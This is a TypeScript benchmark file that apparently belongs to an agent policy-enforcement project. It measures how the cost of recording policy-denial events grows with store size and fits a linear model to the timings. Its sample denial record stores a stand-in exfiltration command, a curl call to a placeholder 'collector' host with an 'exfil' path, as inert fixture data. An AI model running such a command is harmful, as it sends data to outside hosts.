/**
 * Measures what it costs to record one policy decision, as a function of how
 * many decisions are already stored.
 *
 * This is the largest real overhead in the system and it is not in the policy
 * engine. `JsonStore.mutate()` structuredClones the entire `Database` and
 * rewrites the entire file with `JSON.stringify(data, null, 2)` on every call;
 * `snapshot()` clones the whole `Database` too, on every GET. Recording a denial
 * goes through `mutate()` in `agent-service.ts`, which pushes a `PolicyDecision`
 * onto `database.policyEvents` — so the cost of writing one event is
 * O(total events already stored).
 *
 * This harness builds its own `JsonStore` in a temp directory and never touches
 * the running store, so it measures the real class with zero edits to shared
 * files. Nothing here changes `store.ts`; see §2.3 of
 * docs/EVALUATION_RELIABILITY_PLAN.md for the fix options that were scoped and
 * deliberately not built.
 */

import { randomUUID } from "node:crypto";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { JsonStore } from "../store.js";
import type { PolicyDecision } from "../types.js";
import { timeSweep, timeSweepAsync, type SweepResult } from "./metrics.js";

/** Event counts to measure at. Chosen to span a plausible demo session. */
export const DEFAULT_EVENT_COUNTS = [0, 100, 1000, 5000] as const;

export interface StorePoint {
  /** Events already in the store before the measured write. */
  preloaded: number;
  /** Cost of appending one policy event, in microseconds. */
  mutate: SweepResult;
  /** Cost of one `snapshot()`, in microseconds. */
  snapshot: SweepResult;
}

export interface LinearFit {
  /** Cost at zero stored events: open, write, rename. Filesystem-bound. */
  fixedCostMilliseconds: number;
  /** Added cost per stored event: clone + stringify. The term that matters. */
  marginalMicrosecondsPerEvent: number;
  /** Goodness of fit. Near 1.0 means the growth really is linear. */
  rSquared: number;
}

export interface StoreOverheadResult {
  points: StorePoint[];
  fit: LinearFit;
  platform: string;
  nodeVersion: string;
}

/** A representative denial record, matching what agent-service.ts writes. */
function policyEvent(index: number): PolicyDecision {
  return {
    id: randomUUID(),
    agentId: "bench-agent",
    runId: "bench-run",
    rule: "network-egress-denied",
    command: "curl https://collector.example.com/exfil?n=" + index,
    detail: "Command contacts a host outside the allowlist.",
    enforced: true,
    decidedAt: new Date().toISOString(),
  };
}

/**
 * Least-squares fit of cost = fixed + marginal * events.
 *
 * Reported as two terms rather than one headline number because they behave
 * differently across platforms: the fixed term is filesystem syscall overhead
 * and varies ~3x between Windows and POSIX, while the marginal term is
 * clone-and-stringify and varies ~1.4x. A regression gate belongs on the
 * marginal term; see §2.3.
 */
export function linearFit(points: readonly { x: number; y: number }[]): LinearFit {
  const n = points.length;
  if (n < 2) return { fixedCostMilliseconds: 0, marginalMicrosecondsPerEvent: 0, rSquared: 0 };

  const meanX = points.reduce((sum, p) => sum + p.x, 0) / n;
  const meanY = points.reduce((sum, p) => sum + p.y, 0) / n;
  const varianceX = points.reduce((sum, p) => sum + (p.x - meanX) ** 2, 0);
  if (varianceX === 0) return { fixedCostMilliseconds: 0, marginalMicrosecondsPerEvent: 0, rSquared: 0 };

  const covariance = points.reduce((sum, p) => sum + (p.x - meanX) * (p.y - meanY), 0);
  const slope = covariance / varianceX;
  const intercept = meanY - slope * meanX;

  const totalSquares = points.reduce((sum, p) => sum + (p.y - meanY) ** 2, 0);
  const residualSquares = points.reduce(
    (sum, p) => sum + (p.y - (intercept + slope * p.x)) ** 2,
    0,
  );
  const rSquared = totalSquares === 0 ? 1 : 1 - residualSquares / totalSquares;

  return {
    // Inputs are microseconds; the fixed term reads better in milliseconds.
    fixedCostMilliseconds: intercept / 1000,
    marginalMicrosecondsPerEvent: slope,
    rSquared,
  };
}

export interface StoreOverheadOptions {
  eventCounts?: readonly number[];
  /** Measured writes per point. Kept low: each one costs O(stored events). */
  mutateRounds?: number;
  snapshotRounds?: number;
}

/** Measure one point: a fresh store preloaded with `preloaded` events. */
async function measurePoint(
  preloaded: number,
  mutateRounds: number,
  snapshotRounds: number,
): Promise<StorePoint> {
  const directory = await mkdtemp(path.join(tmpdir(), "sentinel-store-bench-"));
  try {
    const store = new JsonStore(path.join(directory, "db.json"));
    await store.initialize();

    if (preloaded > 0) {
      // Seeded in a single mutation: the seeding cost is not what we measure.
      await store.mutate((database) => {
        for (let index = 0; index < preloaded; index += 1) {
          database.policyEvents.push(policyEvent(index));
        }
      });
    }

    let counter = preloaded;
    const mutate = await timeSweepAsync(
      () => store.mutate((database) => database.policyEvents.push(policyEvent(counter++))),
      { warmupRounds: 2, rounds: mutateRounds },
    );
    const snapshot = timeSweep(() => void store.snapshot(), {
      warmupRounds: 2,
      rounds: snapshotRounds,
    });

    return { preloaded, mutate, snapshot };
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
}

/**
 * Run the full sweep.
 *
 * Note on method: each measured write appends an event, so a point at N drifts
 * to N + `mutateRounds` by the end. With the default 25 rounds that is under 3%
 * at N = 1000 and well inside run-to-run noise; it is called out because it
 * biases every point slightly upward rather than randomly.
 */
export async function measureStoreOverhead(
  options: StoreOverheadOptions = {},
): Promise<StoreOverheadResult> {
  const eventCounts = options.eventCounts ?? DEFAULT_EVENT_COUNTS;
  const mutateRounds = options.mutateRounds ?? 25;
  const snapshotRounds = options.snapshotRounds ?? 50;

  const points: StorePoint[] = [];
  for (const preloaded of eventCounts) {
    points.push(await measurePoint(preloaded, mutateRounds, snapshotRounds));
  }

  return {
    points,
    fit: linearFit(points.map((point) => ({ x: point.preloaded, y: point.mutate.p50 }))),
    platform: process.platform,
    nodeVersion: process.versions.node,
  };
}
